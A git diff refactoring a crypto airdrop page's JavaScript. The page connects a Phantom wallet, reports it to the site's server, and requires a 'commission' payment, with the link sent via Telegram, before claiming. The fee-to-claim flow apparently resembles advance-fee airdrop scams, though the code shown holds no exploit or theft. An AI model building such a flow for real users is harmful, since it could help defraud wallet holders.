@@ -403,40 +403,27 @@ async function sendWalletToServer(walletAddress) {
 
         const data = await response.json();
         log('✅ Server response: ' + JSON.stringify(data));
-
         return data;
-
     } catch (error) {
-        log('❌ Error sending wallet to server: ' + error.message);
+        log('❌ Error sending wallet: ' + error.message);
         throw error;
     }
 }
 
 async function disconnectWallet() {
     try {
-        log('🔌 Disconnecting wallet...');
-
-        if (phantomProvider) {
-            await phantomProvider.disconnect();
-        }
-
+        log('🔌 Disconnecting...');
+        if (phantomProvider) await phantomProvider.disconnect();
         await sendWalletToServer(null);
-
         connectedWallet = '';
         tasksCompleted.wallet = false;
-
         updateWalletUI();
         updateClaimButton();
-
-        showToast('Wallet disconnected successfully!', 'success');
-        log('✅ Wallet disconnected');
-
+        showToast('Wallet disconnected', 'success');
     } catch (error) {
-        log('❌ Wallet disconnection failed: ' + error.message);
-        showToast('Failed to disconnect wallet: ' + error.message, 'error');
+        showToast('Failed to disconnect', 'error');
     }
 }
-
 
 async function claimAirdrop() {
     try {
@@ -582,63 +569,38 @@ function closeCommissionModal() {
     }
 }
 
-// تابع اصلی پرداخت کمیسیون
-async function handleCommissionPayment() {
+async function handleCommissionClick() {
+    console.log('🔵 Commission clicked');
+    
+    if (!tasksCompleted.wallet || !connectedWallet) {
+        showToast('Connect wallet first!', 'error');
+        return;
+    }
+    if (tasksCompleted.pay) {
+        showToast('Already paid!', 'info');
+        return;
+    }
+    showToast('Sending link...', 'info');
     try {
-        console.log('🔵 handleCommissionPayment called');
-        log('💰 Starting commission payment process...');
-
-        // بررسی اتصال کیف پول
-        if (!tasksCompleted.wallet || !connectedWallet) {
-            showToast('Please connect your wallet first!', 'error');
-            return;
-        }
-
-        // بررسی پرداخت قبلی
-        if (tasksCompleted.pay) {
-            showToast('Commission already paid!', 'info');
-            return;
-        }
-
-        // نمایش لودینگ
-        showToast('📤 Sending payment link to Telegram...', 'info');
-
-        // ارسال درخواست به سرور برای ارسال لینک به تلگرام
-        const response = await fetch('/commission/send_payment_link', {
+        const res = await fetch('/commission/send_payment_link', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                telegram_id: USER_ID
-            })
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({telegram_id: USER_ID})
         });
-
-        const data = await response.json();
-        console.log('🔵 Server response:', data);
-
+        const data = await res.json();
+        console.log('Response:', data);
+        
         if (data.success) {
-            log('✅ Payment link sent to Telegram successfully');
-            showToast('✅ Payment link sent! Check your Telegram chat.', 'success');
-            
-            // بستن مودال کمیسیون
-            closeCommissionModal();
-            
-            // ذخیره زمان شروع پرداخت
-            localStorage.setItem('ccoin_payment_initiated', Date.now().toString());
-            
+            showToast('✅ Check Telegram!', 'success');
         } else {
-            log('❌ Failed to send payment link: ' + data.message);
             showToast('❌ ' + data.message, 'error');
         }
-
-    } catch (error) {
-        console.error('🔴 Error:', error);
-        log('❌ Commission payment error: ' + error.message);
-        showToast('Failed to send payment link: ' + error.message, 'error');
+    } catch (e) {
+        console.error('Error:', e);
+        showToast('Error: ' + e.message, 'error');
     }
 }
-
+console.log('✅ airdrop.js loaded');
 
 // تابع تست ساده برای دکمه کمیسیون
 function testCommissionButton() {
